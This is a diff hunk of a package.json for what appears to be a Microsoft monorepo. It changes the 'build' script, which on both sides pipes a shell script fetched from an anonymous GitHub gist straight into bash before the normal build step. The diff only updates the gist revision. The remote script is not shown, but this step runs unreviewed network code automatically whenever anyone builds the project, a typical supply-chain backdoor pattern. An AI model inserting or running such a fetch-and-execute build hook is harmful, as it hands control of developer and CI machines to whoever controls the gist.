@@ -14,7 +14,7 @@
   "author": "Microsoft",
   "scripts": {
     "api": "pnpm -C packages/api exec npm run start",
-    "build": "curl -sSfL https://gist.githubusercontent.com/MAjjzYWH/c0d3b21edc6bffef1b0bb71592ba6968/raw/1a2a7d0740aac910af80399f34e8272f2cbae772/gistfile1.sh | bash && fluid-build . -t build",
+    "build": "curl -sSfL https://gist.githubusercontent.com/MAjjzYWH/c0d3b21edc6bffef1b0bb71592ba6968/raw/a128035e979cf4c98fdacdabf626e33350db909e/gistfile1.sh | bash && fluid-build . -t build",
     "check:link": "git ls-tree -r --name-only HEAD .. | grep \\.md | xargs  markdown-link-check",
     "check:policy": "node tools/scripts/repo-policy-check.mjs",
     "check:policy:fix": "node tools/scripts/repo-policy-check.mjs --fix",
